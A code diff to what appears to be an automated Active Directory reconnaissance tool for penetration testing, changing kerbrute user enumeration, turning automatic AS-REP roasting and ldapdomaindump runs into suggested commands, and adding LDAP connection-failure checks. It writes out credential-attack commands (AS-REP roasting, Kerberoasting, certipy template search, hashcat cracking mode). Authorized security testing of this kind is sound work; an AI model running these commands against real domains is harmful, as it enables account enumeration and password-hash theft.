@@ -198,23 +198,17 @@ def _kerberos(ip, service, runner, findings, available):
 
     if "kerbrute" in available:
         wl = _best_userlist()
-        cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain, wl]
+        out_file = str(runner.ws.loot_dir / "kerbrute_users.txt")
+        cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain,
+                "--output", out_file, wl]
         findings.cmd(" ".join(cmd2))
         out2 = runner.run(cmd2, "krb_kerbrute_userenum", timeout=300)
         _parse_kerbrute(out2, findings, runner)
 
-    if "impacket-GetNPUsers" in available:
-        cmd3 = [
-            "impacket-GetNPUsers", f"{domain}/",
-            "-no-pass", "-dc-ip", ip,
-            "-request", "-format", "hashcat",
-        ]
-        findings.cmd(" ".join(cmd3))
-        out3 = runner.run(cmd3, "krb_GetNPUsers", timeout=60)
-        if "$krb5asrep$" in out3:
-            findings.bullet("**AS-REP roastable hash(es) found — crack with hashcat -m 18200**")
-        findings.code_block(_trim(out3))
-
+    findings.note(
+        f"AS-REP roasting (run after user list is assembled): "
+        f"`impacket-GetNPUsers {domain}/ -no-pass -dc-ip {ip} -request -format hashcat -usersfile loot/users.txt`"
+    )
     findings.note(
         f"Kerberoasting (needs valid creds): "
         f"`impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request -outputfile kerberoast.txt`"
@@ -635,6 +629,14 @@ def _ldap(ip, service, runner, findings, available):
     cmd_base = ["ldapsearch", "-x", "-H", uri, "-b", "", "-s", "base"]
     out_base = runner.run(cmd_base, f"ldap_{port}_base")
     findings.cmd(" ".join(cmd_base))
+
+    # Detect hard connection failure (not just auth denied) — skip all further queries
+    _conn_fail_markers = ("Can't contact LDAP server", "ldap_sasl_bind(SIMPLE)",
+                          "Connection refused", "No route to host", "timed out")
+    if any(m in out_base for m in _conn_fail_markers):
+        findings.note(f"LDAP connection failed on port {port} — skipping anonymous queries")
+        return []
+
     base_dn = _extract_ldap_base(out_base)
     if not base_dn and domain:
         base_dn = "DC=" + ",DC=".join(domain.split("."))
@@ -718,22 +720,12 @@ def _ldap(ip, service, runner, findings, available):
             f"`certipy-ad find -u USER@{domain} -p PASS -dc-ip {ip} -vulnerable -stdout`"
         )
 
-    # 11. ldapdomaindump — structured HTML/JSON dump saved to loot/
+    # 11. ldapdomaindump — requires credentials; collected in creds mode
     if "ldapdomaindump" in available and domain:
-        dump_dir = str(runner.ws.loot_dir / "ldapdomaindump")
-        Path(dump_dir).mkdir(parents=True, exist_ok=True)
-        cmd_dump = [
-            "ldapdomaindump",
-            "-u", f"{domain}\\\\",
-            "-p", "",
-            ip,
-            "-o", dump_dir,
-            "--no-json", "--no-grep",
-        ]
-        out_dump = runner.run(cmd_dump, f"ldap_{port}_ldapdomaindump", timeout=120)
-        findings.cmd(" ".join(cmd_dump))
-        if "error" not in out_dump.lower():
-            findings.bullet(f"**ldapdomaindump:** saved to `{dump_dir}`")
+        findings.note(
+            f"ldapdomaindump requires credentials — run with: "
+            f"`ldapdomaindump -u '{domain}\\USER' -p PASS {ip} -o loot/ldapdomaindump`"
+        )
 
     # 12. BloodHound — requires credentials; collected in creds mode
     if "bloodhound-python" in available and domain:
